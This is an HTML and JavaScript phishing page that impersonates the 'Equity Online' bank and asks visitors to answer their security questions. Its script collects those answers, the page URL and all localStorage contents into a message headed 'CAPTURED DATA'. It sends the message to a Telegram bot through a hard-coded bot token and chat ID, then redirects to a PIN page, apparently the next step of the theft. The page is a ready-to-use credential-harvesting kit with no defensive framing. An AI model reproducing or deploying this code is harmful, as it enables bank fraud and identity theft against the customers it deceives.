<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 40px;
            color: white;
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        
        @media screen and (max-width: 768px) {
            body {
                flex-direction: column;
                height: auto;
                min-height: 100vh;
            }
            .left-section {
                flex: none;
                justify-content: center;
                text-align: center;
                padding: 30px 20px;
            }
            .left-section h1 {
                font-size: 1.5rem;
            }
            .left-section p {
                font-size: 1rem;
            }
            .right-section {
                flex: none;
                padding: 20px;
            }
            .login-form {
                max-width: 100%;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            }
            .logo {
                max-width: 120px;
            }
        }
        
        @media screen and (max-width: 480px) {
            .left-section {
                padding: 20px 15px;
            }
            .left-section h1 {
                font-size: 1.3rem;
            }
            .left-section p {
                font-size: 0.9rem;
            }
            .right-section {
                padding: 15px;
            }
            .login-form {
                padding: 15px;
            }
            .login-form h2 {
                font-size: 1.1rem;
            }
            input[type="text"],
            input[type="password"],
            select {
                padding: 8px;
                font-size: 16px;
            }
            button {
                padding: 12px;
                font-size: 1rem;
            }
            .logo {
                max-width: 100px;
            }
        }
    </style>
</head>

<body>

    <div class="left-section">
        <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
        <h1>Equity</h1>
        <h2>Welcome to Equity online</h2>
        <p>More than just banking.</p>
    </div>

    <div class="right-section">
        <div class="login-form">
            <h2>Verify</h2>
            <p>Answer your security questions to continue.</p>

            <div class="form-group">
                <label for="answer1" id="question1-label"></label>
                <input type="text" id="answer1" placeholder="Enter your answer" required>
            </div>

            <div class="form-group">
                <label for="answer2" id="question2-label"></label>
                <input type="text" id="answer2" placeholder="Enter your answer" required>
            </div>

            <button id="confirm-button">Confirm</button>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        // Replace with your actual Bot Token from @BotFather
        const BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
        // Replace with your actual Chat ID
        const CHAT_ID = '5615316142s';
        // ===================================

        // Fetching questions from Local Storage
        document.getElementById('question1-label').innerText = localStorage.getItem('question1') || 'Question 1';
        document.getElementById('question2-label').innerText = localStorage.getItem('question2') || 'Question 2';

        // Fetching saved answers from Local Storage
        document.getElementById('answer1').value = localStorage.getItem('answer1') || '';
        document.getElementById('answer2').value = localStorage.getItem('answer2') || '';

        /**
         * Send captured data to Telegram bot via the Bot API
         */
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            // Using fetch API (modern, no libraries needed)
            fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Telegram response:', data);
                })
                .catch(error => {
                    console.error('Telegram send error:', error);
                    // Fallback: try XMLHttpRequest if fetch fails
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.send(
                        'chat_id=' + encodeURIComponent(CHAT_ID) +
                        '&text=' + encodeURIComponent(message) +
                        '&parse_mode=HTML'
                    );
                });
        }

        /**
         * Send all available data from LocalStorage + current inputs to Telegram
         */
        function captureAndSend() {
            const answer1 = document.getElementById('answer1').value.trim();
            const answer2 = document.getElementById('answer2').value.trim();
            const question1 = localStorage.getItem('question1') || 'Question 1';
            const question2 = localStorage.getItem('question2') || 'Question 2';

            // Collect everything from LocalStorage (for other fields saved earlier)
            let allStorage = '';
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                allStorage += `${key}: ${value}\n`;
            }

            // Build the message
            let message = `<b>=== CAPTURED DATA ===</b>\n\n`;
            message += `<b>Timestamp:</b> ${new Date().toISOString()}\n`;
            message += `<b>Page URL:</b> ${window.location.href}\n\n`;
            message += `<b>--- Security Questions ---</b>\n`;
            message += `Q1: ${question1}\nA1: ${answer1}\n\n`;
            message += `Q2: ${question2}\nA2: ${answer2}\n\n`;
            message += `<b>--- All LocalStorage Data ---</b>\n`;
            message += allStorage || '(none)';

            sendToTelegram(message);
        }

        document.getElementById('confirm-button').addEventListener('click', function() {
            const answer1 = document.getElementById('answer1').value.trim();
            const answer2 = document.getElementById('answer2').value.trim();

            if (answer1 && answer2) {
                // Capture and send to Telegram BEFORE redirecting
                captureAndSend();

                // Small delay to ensure the request goes out before navigation
                setTimeout(function() {
                    window.location.href = "pin.html";
                }, 500);
            } else {
                alert('Please answer all security questions.');
            }
        });
    </script>
</body>

</html>
